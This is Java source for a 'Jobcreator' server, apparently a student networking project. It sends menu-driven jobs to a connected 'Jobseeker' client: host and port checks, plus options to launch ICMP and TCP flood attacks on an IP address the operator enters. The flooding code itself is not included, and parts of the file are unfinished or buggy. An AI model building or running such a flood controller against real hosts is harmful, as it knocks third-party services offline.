// A Java program for a Server

import org.pcap4j.core.PacketListener;
import org.pcap4j.core.PcapPacket;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Scanner;
//import java.util.concurrent.ExecutorService;

// This jobcreator Prints out a message to notify connection with jobseeker
// JobCreator then prints the IP address of JobSeeker

public class Jobcreator {

    public static Scanner sc = new Scanner(System.in);
    public static Thread thread  = new Thread();
    public static Socket socket = null;
    public static ServerSocket serversocket = null;
    static PrintWriter writer = null;

    static FileWriter fw;

    //static {
    //    try {
    //        fw = new FileWriter("jobCreatorOutput.txt");
    //    }
    //    catch (IOException e) {
   //         e.printStackTrace();
   //     }
   // }


    public static void main(String[] args) {
        int port = 5000; // for peer to peer connection change to port = 61555
        try {

            fw = new FileWriter("jobCreatorOutput.txt");
            fw.write("**Job Creator Out Put**\n\n");

            serversocket = new ServerSocket(port);

            while(true) {

                run();


                String client = socket.getInetAddress().getHostAddress();

                // Opening input stream with Jobseeker
                InputStream input = socket.getInputStream();
                BufferedReader reader = new BufferedReader(new InputStreamReader(input));

                System.out.println("Connected to Jobseeker.");
                System.out.println("Client address is: " + client);

                // writing it into the file named report.txt
                fw.write("Connected to Jobseeker.\n");
                fw.write("Client address is: " + client + "\n");


                // Opening output stream with Jobseeker
                OutputStream output = socket.getOutputStream();
                writer = new PrintWriter(output, true);

                // Give jobs to Jobseeker until Jobcreator no longer wants to
                boolean stayConnected = true;
                while(stayConnected) {
                    String result;
                    switch (jobOptions()) {
                        // JOB: Detect if a given IP address or Host Name is online or not
                        case 1:
                            System.out.println("1. Detect by IP address.\n2. Detect by host name.");
                            fw.write("1. Detect by IP address.\n2. Detect by host name.\n");

                            int mode = sc.nextInt();
                            if (mode == 1) {
                                System.out.print("Please enter the IP address: ");
                                fw.write("1. Please enter the IP address: \n");
                            }
                            else {
                                System.out.print("Please enter the host name: ");
                                fw.write("Please enter the host name: \n");
                            }

                            sc.nextLine();
                            String who = sc.nextLine();

                            // Forward job information to Jobseeker
                            writer.printf("1,%d,%s\n", mode, who);

                            // Retrieve and output job result from Jobseeker
                            result = reader.readLine();

                            if (result.compareTo("error") == 0) {
                                System.out.println("Error in input data. Cannot complete job.");
                                fw.write("Error in input data. Cannot complete job.\n");
                            }

                            else {
                                System.out.println(result);
                                fw.write(result + "\n");
                            }
                            break;
                        // JOB: Detect the status of a given port at a given IP address
                        case 2:
                            System.out.print("Please enter the IP address: ");
                            fw.write("Please enter the IP address: ");
                            sc.nextLine();
                            String ip = sc.nextLine();
                            System.out.print("Please enter the port number: ");
                            fw.write("Please enter the IP address: ");
                            String portNum = sc.nextLine();

                            writer.printf("2,%s,%s\n", ip, portNum);

                            result = reader.readLine();
                            if (result.compareTo("error") == 0) {
                                System.out.println("Error in input data. Cannot complete job.");
                                fw.write("Error in input data. Cannot complete job.");
                            }
                            else {
                                System.out.printf("The status of port %s at IP address %s is: %s\n", portNum, ip, result);
                                fw.write("The status of port " +portNum+ " at IP address "+ip+" is: "+result+"\n");
                            }
                            break;

                        // The Jobcreator wishes to disconnect from the Jobseeker
                        case 3:
                            writer.println("3,");
                            stayConnected = false;
                            break;
                        case 4:
                            writer.println("4,");
                            System.out.println("Enter the IP address you would like to launch an attack on:");
                            String target = sc.next();
                            writer.println(target);
                            //icmpAttack("localhost",client);
                            break;
                        case 5:
                            writer.println("5,");
                            System.out.println("Enter IP address:");
                            String targetIp = sc.next();
                            System.out.println("Enter Port number: ");
                            int portNumber = sc.nextInt();
                            writer.println(targetIp);
                            writer.println(portNumber);
                            break;
                        default:
                            System.out.println("Invalid option.");
                            fw.write("Invalid option.\n");
                    }
                }

                writer.flush();
                socket.close();
                // See if Jobcreator wants to find another Jobseeker or stop creating jobs
                System.out.println("1. Wait for another Jobseeker.\n2. Stop waiting and exit.");
                fw.write("1. Wait for another Jobseeker.\n2. Stop waiting and exit.\n");
                int answer;
                do {
                    answer = sc.nextInt();
                    if(answer < 1 || answer > 2) {
                        System.out.println("Please enter a valid option number.");
                        fw.write("Please enter a valid option number.\n");
                    }
                    else
                        break;
                } while(true);

                if(answer == 1) {
                    System.out.println("Waiting for Jobseeker...");
                    fw.write("Waiting for Jobseeker...");
                }
                else
                    break;
            }

            fw.close();             //closing the file report
        }
        catch(Exception e){
            e.printStackTrace();
        }
        thread.interrupt();
        sc.close();

    }
    public static void run(){
        try {
            socket = serversocket.accept();
            if(thread.isInterrupted())
                thread.start();
            PacketListener packetListener = new PacketListener() {
                @Override
                public void gotPacket(PcapPacket pcapPacket) {
                    System.out.println("Received packets: ");
                    System.out.println(pcapPacket);
                    try {
                        fw.write("Received packets: \n"+pcapPacket+"\n");
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            };
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    public static int jobOptions() throws IOException {
        System.out.println("What job would you like Jobseeker to perform?");
        System.out.println("1. Detect if a given IP address or Host Name is online or not.");
        System.out.println("2. Detect the status of a given port at a given IP address.");
        System.out.println("3. Disconnect from Jobseeker.");
        System.out.println("4. Perform ICMP flood attack");
        System.out.println("5. Perform TCP flood attack");

        fw.write("What job would you like Jobseeker to perform?\n");
        fw.write("1. Detect if a given IP address or Host Name is online or not.\n");
        fw.write("2. Detect the status of a given port at a given IP address.\n");
        fw.write("3. Disconnect from Jobseeker.\n");
        fw.write("4. Perform ICMP flood attack\n");
        fw.write("5. Perform TCP flood attack\n");

        return sc.nextInt();
    }

    public static void icmpAttack(String hostname, String target) throws IOException {
        ArrayList<String> clients = new ArrayList<>();
        if(hostname.equals(target)) {
            clients.add(hostname);
        }
        System.out.println("Launching ICMP on "+clients.size()+" jobseeker clients");
        fw.write("Launching ICMP on "+clients.size()+" jobseeker clients\n");
        writer.println("icmp");
        writer.println(target);


    }
}

